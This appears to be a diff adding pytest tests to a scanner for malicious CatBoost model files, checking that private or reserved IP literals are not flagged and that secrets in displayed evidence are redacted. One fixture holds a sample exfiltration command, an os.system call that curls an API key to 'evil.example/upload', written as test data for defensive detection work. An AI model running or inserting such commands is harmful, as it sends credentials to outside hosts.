@@ -293,7 +293,10 @@ def test_scan_detects_public_ip_network_indicators(tmp_path: Path, indicator: st
     assert indicator in str(network_check.details)
 
 
-@pytest.mark.parametrize("indicator", ["999.999.999.999", "fd00::1"])
+@pytest.mark.parametrize(
+    "indicator",
+    ["999.999.999.999", "fd00::1", "ff02::1", "64:ff9b::192", "224.0.0.1", "240.0.0.1"],
+)
 def test_scan_ignores_invalid_or_private_ip_like_metadata(tmp_path: Path, indicator: str) -> None:
     model_path = tmp_path / "benign_ip_like_metadata.cbm"
     model_path.write_bytes(_build_cbm([f"model_version={indicator}"]))
@@ -302,6 +305,17 @@ def test_scan_ignores_invalid_or_private_ip_like_metadata(tmp_path: Path, indica
 
     network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
     assert network_check.status == CheckStatus.PASSED
+
+
+@pytest.mark.parametrize("indicator", ["ff02::1", "64:ff9b::192", "224.0.0.1", "240.0.0.1"])
+def test_scan_does_not_correlate_commands_with_non_public_ip_literals(tmp_path: Path, indicator: str) -> None:
+    model_path = tmp_path / "non_public_ip_command.cbm"
+    model_path.write_bytes(_build_cbm([f"os.system('echo {indicator}')"]))
+
+    result = CatBoostScanner().scan(str(model_path))
+
+    correlation_check = next(check for check in result.checks if check.name == "Command/Network Correlation Check")
+    assert correlation_check.status == CheckStatus.PASSED
 
 
 def test_scan_redacts_urls_in_catboost_findings(tmp_path: Path) -> None:
@@ -1955,6 +1969,17 @@ def test_catboost_display_redacts_standalone_percent_encoded_assignments(evidenc
     assert "<redacted>" in redacted
     assert "os.system" in redacted
     assert _redact_reversible_percent_evidence(evidence) == redacted
+
+
+def test_catboost_display_finishes_percent_decoding_after_partial_redaction() -> None:
+    evidence = "os.system('curl --data foo%3Dapi_key%253Dhunter2 https://evil.example/upload')"
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "hunter2" not in redacted
+    assert "%3Dhunter2" not in redacted
+    assert "<redacted>" in redacted
+    assert "evil.example/upload" in redacted
 
 
 def test_catboost_display_preserves_benign_standalone_percent_encoding() -> None:
